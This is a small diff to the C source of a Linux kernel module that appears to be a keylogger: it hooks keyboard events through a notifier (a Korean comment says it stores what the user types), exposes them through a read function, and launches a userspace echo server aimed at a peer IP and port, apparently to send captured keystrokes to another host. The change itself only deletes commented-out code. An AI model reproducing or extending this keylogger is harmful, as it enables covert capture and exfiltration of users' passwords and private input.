@@ -9,8 +9,6 @@ static int shiftkey_On = 0;
 
 static int start_echo(void)
 {
-    // struct subprocess_info *sub_info;
-
     char *argv[] = {ECHO_SERVER, PEER_IP, PORT, NULL};
     static char *envp[] = {
         "HOME=/",
@@ -19,7 +17,6 @@ static int start_echo(void)
     };
 
     return call_usermodehelper( argv[0], argv, envp, UMH_WAIT_EXEC );
-    // return call_usermodehelper_exec(sub_info, UMH_WAIT_EXEC);
 }
 
 int klg_init(void) {
@@ -97,33 +94,6 @@ ssize_t klg_read(struct file *filp, char __user *buf, size_t count, loff_t *f_po
 
     return bytes;
 }
-
-// int caps_lock_status(void)
-// {
-//     int fd;
-//     long int arg;
-//     fd = open("/dev/console",O_RDONLY);
-//     if(fd == -1)
-//     {
-//         perror("open file error");
-//         exit(-1);
-//     }
-//     if(ioctl(fd,KDGETLED, &arg)==-1)
-//     {
-//         perrer("ioctl func error");
-//         exit(-1);
-//     }
-
-//         /* LED_SCR = 0x1, LED_NUM = 0x2, LED_CAP = 0x4 */
-
-//     close(fd);
-
-//     if(arg==LED_CAP||arg==LED_CAP+LED_NUM||arg==LED_CAP+LED_SCR||arg==LED_CAP+LED_SCR+LED_NUM)//caps lock status on
-//         return 1;
-//     else// caps lock status off
-//         return 0;
-
-// }
 
 int kbd_notifier(struct notifier_block* nblock, unsigned long code, void* _param) {
     struct keyboard_notifier_param *param = _param; //사용자가 입력한 문자를 저장함
